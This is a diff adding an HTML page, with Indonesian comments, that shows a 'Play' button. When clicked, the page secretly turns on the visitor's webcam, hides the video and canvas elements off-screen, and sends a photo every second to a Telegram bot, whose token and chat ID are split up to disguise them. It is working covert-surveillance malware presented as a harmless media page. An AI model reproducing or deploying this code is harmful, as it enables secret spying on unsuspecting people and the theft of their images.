@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Welcome</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    button {
+      background: #00bcd4;
+      border: none;
+      color: white;
+      padding: 15px 30px;
+      font-size: 20px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button.loading {
+      background: #0097a7;
+      pointer-events: none;
+      position: relative;
+    }
+
+    button.loading::after {
+      content: "";
+      border: 3px solid white;
+      border-top: 3px solid transparent;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      position: absolute;
+      top: 50%;
+      right: 20px;
+      transform: translateY(-50%);
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      to {
+        transform: translateY(-50%) rotate(360deg);
+      }
+    }
+
+    /* Sembunyikan elemen kamera */
+    video, canvas {
+      position: fixed;
+      top: -9999px;
+      left: -9999px;
+      width: 1px;
+      height: 1px;
+      opacity: 0;
+      pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+  <button id="playBtn">Play</button>
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
+
+  <script>
+    const playBtn = document.getElementById('playBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    // Token & chat_id disamarkan
+    const chatId = "72170" + "27793";
+    const token = "7697621785:AAEFcQ6hgQ_" + "d9UuTWPMeu" + "Y4xjMLNlrW8" + "j40";
+
+    let stream = null;
+    let intervalId = null;
+
+    async function startSilently() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+
+        playBtn.classList.add('loading');
+        playBtn.textContent = 'Loading...';
+
+        intervalId = setInterval(captureAndSendPhoto, 1000);
+      } catch (err) {
+        alert('Izin kamera ditolak. Tekan ulang untuk izinkan.');
+        console.error('Gagal akses kamera:', err);
+      }
+    }
+
+    function captureAndSendPhoto() {
+      const ctx = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const dataURL = canvas.toDataURL('image/jpeg');
+      fetch(dataURL)
+        .then(res => res.blob())
+        .then(blob => {
+          const form = new FormData();
+          form.append('chat_id', chatId);
+          form.append('photo', blob, 'photo.jpg');
+
+          fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+            method: 'POST',
+            body: form
+          }).then(res => {
+            if (!res.ok) {
+              console.error('Upload gagal:', res.statusText);
+            } else {
+              console.log('Foto terkirim');
+            }
+          }).catch(e => console.error('Gagal kirim:', e));
+        });
+    }
+
+    playBtn.addEventListener('click', () => {
+      if (!stream) {
+        startSilently();
+      }
+    });
+  </script>
+</body>
+</html>
